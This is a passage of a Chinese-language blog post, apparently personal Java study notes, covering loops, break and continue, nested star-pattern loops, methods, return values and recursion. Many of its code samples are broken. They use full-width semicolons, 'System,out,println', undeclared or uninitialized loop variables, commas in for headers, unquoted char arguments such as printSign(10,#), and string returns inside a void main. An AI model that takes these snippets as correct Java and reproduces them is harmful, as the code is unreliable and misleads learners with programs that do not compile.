class="number">1</span>)&#123;</span><br><span class="line">                odd+=i;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                even+=i;</span><br><span class="line">            &#125;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;sum=&quot;</span>+sum);</span><br><span class="line">        System.out.println(<span class="string">&quot;odd=&quot;</span>+odd);</span><br><span class="line">        System.out.println(<span class="string">&quot;even=&quot;</span>+even);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><h3 id="do-whlie"><a href="#do-whlie" class="headerlink" title="do-whlie"></a>do-whlie</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a4ac192dc.png" alt="image-20240318085719545"></p><p><img src="https://bu.dusays.com/2024/05/13/6641a4ab38a6f.png" alt="image-20240318085754781"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">         Scanner scanner=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="type">int</span> score;</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;第一阶段成绩为：&quot;</span>)；</span><br><span class="line">                score=scanner.nextInt();</span><br><span class="line">        &#125;<span class="keyword">while</span>(score&lt;<span class="number">60</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;本阶段考试成功&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">int</span> i=<span class="number">1</span>;</span><br><span class="line">       <span class="keyword">do</span>&#123;</span><br><span class="line">           System.out.println(<span class="string">&quot;第&quot;</span>+i+<span class="string">&quot;次输出HelloWorld&quot;</span>);</span><br><span class="line">           i++</span><br><span class="line">       &#125; <span class="keyword">while</span>(i&lt;=<span class="number">100</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;结束&quot;</span>)；</span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a4b37b416.png" alt="image-20240318091044774"></p><h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a4b5d44a4.png" alt="image-20240318091239565"></p><p>for循环是从while循环演变过来的，所以他们之间可以互相转换</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//累乘</span></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        Scanner scanner=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System,out,println(<span class="string">&quot;输入一个数&quot;</span>)；</span><br><span class="line">        <span class="type">int</span> mul=<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> n=scanner.nextInt();</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            mul=mul*i;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(mul);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//求平均分</span></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">         Scanner scanner=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=<span class="number">5</span>;i++)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;第&quot;</span>+i+<span class="string">&quot;名同学分数：&quot;</span>)；</span><br><span class="line">                <span class="type">int</span> <span class="variable">score</span> <span class="operator">=</span>scanner.nextInt();</span><br><span class="line">            sum+=score;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;平均分为&quot;</span>+sum/<span class="number">5</span>)；</span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><h3 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h3><h4 id="break"><a href="#break" class="headerlink" title="break"></a>break</h4><p><img src="https://bu.dusays.com/2024/05/13/6641a4b1327db.png" alt="image-20240318092620473"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">int</span> i=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(;i&lt;=<span class="number">10</span>;i++)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;第&quot;</span>+i+<span class="string">&quot;个数字&quot;</span>)；</span><br><span class="line">                <span class="keyword">if</span>(i==<span class="number">5</span>)&#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;完成，此时i为：&quot;</span>+i)；</span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><p>Break后会直接跳过后续代码，且for中不会I++</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//求平均分</span></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">         Scanner scanner=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=<span class="number">5</span>;i++)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;第&quot;</span>+i+<span class="string">&quot;名同学分数：&quot;</span>)；</span><br><span class="line">                <span class="type">int</span> <span class="variable">score</span> <span class="operator">=</span>scanner.nextInt();</span><br><span class="line">            <span class="keyword">if</span>(score&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;输入异常，终止输入&quot;</span>)；</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            sum+=score;</span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(count==<span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;本次录入无效&quot;</span>)；</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">              System.out.println(<span class="string">&quot;当前人数为：&quot;</span>+count+<span class="string">&quot;平均分为&quot;</span>+sum/count)；</span><br><span class="line">             &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><h4 id="continue"><a href="#continue" class="headerlink" title="continue"></a>continue</h4><p><img src="https://bu.dusays.com/2024/05/13/6641a4b20efbd.png" alt="image-20240318094033665"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">int</span> i=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(;i&lt;=<span class="number">10</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i==<span class="number">5</span>)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;第&quot;</span>+i+<span class="string">&quot;个数字&quot;</span>)；</span><br><span class="line">                </span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;完成，此时i为：&quot;</span>+i)；</span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><p>会跳过后续代码，但会继续执行循环，执行i++</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//求平均分</span></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">         Scanner scanner=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=<span class="number">5</span>;i++)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;第&quot;</span>+i+<span class="string">&quot;名同学分数：&quot;</span>)；</span><br><span class="line">                <span class="type">int</span> <span class="variable">score</span> <span class="operator">=</span>scanner.nextInt();</span><br><span class="line">            <span class="keyword">if</span>(score&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;输入异常，重新输入&quot;</span>)；</span><br><span class="line">                    </span><br><span class="line"> i--;                   <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            sum+=score;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        System.out.println(<span class="string">&quot;平均分为&quot;</span>+sum/<span class="number">5</span>)；</span><br><span class="line">            </span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><h3 id="嵌套循环"><a href="#嵌套循环" class="headerlink" title="嵌套循环"></a>嵌套循环</h3><p>概念：在一个完整的循环结构中，嵌套另一个完整的循环</p><p><strong>外层循环循环一次，内存循环循环一轮</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//三行五列*</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">    <span class="comment">//外层循环控制行数，内层循环控制列数</span></span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">3</span>;i++)&#123;</span><br><span class="line">           <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">5</span>;j++)&#123;</span><br><span class="line">           System.out.print(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           System.out.println();</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><p><strong>外层循环控制行数，内层循环控制列数</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//计算三个班，每个班5名同学的平均成绩</span></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">      Scanner scanner=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i;i&lt;=<span class="number">3</span>;i++)&#123;</span><br><span class="line">            <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j;j&lt;=<span class="number">5</span>;j++)&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;第&quot;</span>+i+<span class="string">&quot;个班，第&quot;</span>+j+<span class="string">&quot;个同学的成绩是：&quot;</span>);</span><br><span class="line">                sum+=scanner.nextInt();</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;第&quot;</span>+i+<span class="string">&quot;个班的平均分是：&quot;</span>+sum/<span class="number">5</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//打印图型</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="comment">//打印正直角三角形</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i;i&lt;=<span class="number">5</span>;i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j;j&lt;=i,j++)&#123;<span class="comment">//通过i来控制j </span></span><br><span class="line">System.out.print(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印反的直角三角形</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i;i&lt;=<span class="number">5</span>;i++)&#123;</span><br><span class="line"><span class="comment">//用一个循环来打印空格</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">5</span>-i;j++)&#123;</span><br><span class="line">System.out.print(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j;j&lt;=i,j++)&#123;<span class="comment">//通过i来控制j 打印*</span></span><br><span class="line">System.out.print(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印等腰三角形</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i;i&lt;=<span class="number">5</span>;i++)&#123;</span><br><span class="line"><span class="comment">//用一个循环来打印空格</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">5</span>-i;j++)&#123;</span><br><span class="line">System.out.print(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j;j&lt;=<span class="number">2</span>*i-<span class="number">1</span>,j++)&#123;<span class="comment">//通过i来控制j 打印* 1，3，5，7，9找规律</span></span><br><span class="line">System.out.print(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印菱形</span></span><br><span class="line"><span class="comment">//打印菱形上半部分</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i;i&lt;=<span class="number">5</span>;i++)&#123;</span><br><span class="line"><span class="comment">//用一个循环来打印空格</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">5</span>-i;j++)&#123;</span><br><span class="line">System.out.print(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j;j&lt;=<span class="number">2</span>*i-<span class="number">1</span>,j++)&#123;<span class="comment">//通过i来控制j 打印* 1，3，5，7，9找规律</span></span><br><span class="line">System.out.print(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//打印菱形下半部分</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i;i&lt;=<span class="number">5</span>;i++)&#123;</span><br><span class="line"><span class="comment">//用一个循环来打印空格</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=i;j++)&#123;</span><br><span class="line">System.out.print(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j;j&lt;=<span class="number">2</span>*(<span class="number">5</span>-i)-<span class="number">1</span>,j++)&#123;<span class="comment">//通过i来控制j 打印* 7,5,3,1找规律</span></span><br><span class="line">System.out.print(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><h2 id="方法与函数"><a href="#方法与函数" class="headerlink" title="方法与函数"></a>方法与函数</h2><p>实际上方法就是函数，只是在面向对象编程中，将函数称为方法</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a4b1ca20d.png" alt="image-20240320113041653"></p><p><strong>在java中不允许在方法中定义方法</strong></p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b35464c.png" alt="image-20240320113240845"></p><p>所以只有2和4能定义方法</p><p>main方法是程序的入口，一开始程序就会执行，而普通方法必须在main方法中进行调用才能执行</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;窗前明月光，&quot;</span>);</span><br><span class="line">printSign();</span><br><span class="line">System.out.println(<span class="string">&quot;疑是地上霜。&quot;</span>);</span><br><span class="line">printSign();</span><br><span class="line">System.out.println(<span class="string">&quot;举头望明月，&quot;</span>);</span><br><span class="line">printSign();</span><br><span class="line">System.out.println(<span class="string">&quot;低头思故乡。&quot;</span>);</span><br><span class="line">printSign();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">printSign</span><span class="params">()</span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;---------&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在需要执行代码的地方，通过方法名称进行调用方法</p><p>调用方法时，会优先执行方法内部代码，结束后，返回到方法调用处，继续向下执行</p><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p>形参与实参</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b24409d.png" alt="image-20240325085238714"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;窗前明月光，&quot;</span>);</span><br><span class="line">printSign(<span class="number">10</span>,#);</span><br><span class="line">System.out.println(<span class="string">&quot;疑是地上霜。&quot;</span>);</span><br><span class="line">printSign(<span class="number">10</span>,$);</span><br><span class="line">System.out.println(<span class="string">&quot;举头望明月，&quot;</span>);</span><br><span class="line">printSign(<span class="number">10</span>,%);</span><br><span class="line">System.out.println(<span class="string">&quot;低头思故乡。&quot;</span>);</span><br><span class="line">printSign(<span class="number">10</span>,^);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">printSign</span><span class="params">(<span class="type">int</span> count,<span class="type">char</span> sign)</span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>;i&lt;=count;i++)&#123;</span><br><span class="line">            System.out.println(sign);</span><br><span class="line">    &#125;</span><br><span class="line">        System.out.println();  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>参数是调用者给方法的输入，返回值是方法给调用者的反馈</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4ab3dd57.png" alt="image-20240325090312312"></p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b2a02f3.png" alt="image-20240325090450620"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">int</span> a;</span><br><span class="line">        <span class="type">int</span> b;</span><br><span class="line">        <span class="type">int</span>  <span class="variable">c</span> <span class="operator">=</span> add(a,b);</span><br><span class="line">        System.out.println(c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">add</span> <span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a+b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><p><strong>返回值只能有一个，也就是说返回过来的值只能有一个</strong></p><p>即：<strong>不能有</strong>：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">add</span> <span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">    <span class="keyword">return</span> a-b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这种要写成两个方法</span></span><br></pre></td></tr></table></figure><p>但是这种可以：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">int</span> a;</span><br><span class="line">        <span class="type">int</span> b;</span><br><span class="line">        <span class="keyword">if</span>(num%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;偶数&quot;</span>；</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;奇数&quot;</span>；</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><p>同时这种不行：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">int</span> num;</span><br><span class="line">        <span class="keyword">if</span>(num%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;偶数&quot;</span>；</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(num%==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;奇数&quot;</span>；</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//至少要加这个 return &quot;xx&quot;；</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>因为编译器认为你else if后面可能还有if 而if后没有返回值 报错，所以至少要在后面再加一个返回值</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4ab12442.png" alt="image-20240325093005531"></p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b20bb4b.png" alt="image-20240325093124926"></p><p>如果此时是break,是指跳到for循环外，继续执行后续代码，这里是到}外</p><p>而return,在无返回值时可写可不写，写了就表示结束方法，这里时回到{</p><h3 id="调用与递归"><a href="#调用与递归" class="headerlink" title="调用与递归"></a>调用与递归</h3><h4 id="多级调用："><a href="#多级调用：" class="headerlink" title="多级调用："></a>多级调用：</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        m1();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">m1</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;m1-start&quot;</span>);</span><br><span class="line">        m2();</span><br><span class="line">        System.out.println(<span class="string">&quot;m1-end&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">m2</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;m2-start&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;m2-end&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>先执行m1,再执行m2,然后执行m1后续</p><h4 id="无穷递归"><a href="#无穷递归" class="headerlink" title="无穷递归"></a>无穷递归</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        m1();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">m1</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;m1-start&quot;</span>);</span><br><span class="line">        m1();</span><br><span class="line">        System.out.println(<span class="string">&quot;m1-end&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>此时会无限调用m1,导致方法栈溢出，报错</p><h4 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h4><p><img src="https://bu.dusays.com/2024/05/13/6641a4b0cb657.png" alt="image-20240325094945449"></p><p>递归阶乘</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b4e0411.png" alt="image-20240325095147430"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> f(<span class="number">5</span>);</span><br><span class="line">        System.out.println(num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> n==<span class="number">1</span>?<span class="number">1</span>:n*f(n-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>if同理</p><p>递归：斐波那契数列</p><p>后面的数是前两个数之和：1 1 2 3 5 8 13 21 34 55 </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">int</span> num=getRabit(<span class="number">20</span>);</span><br><span class="line">        System.out,println(num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getRabit</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> n==<span class="number">1</span>||n==<span class="number">2</span>?<span class="number">1</span>:getRabit(n-<span class="number">1</span>)+getRabit(n-<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span 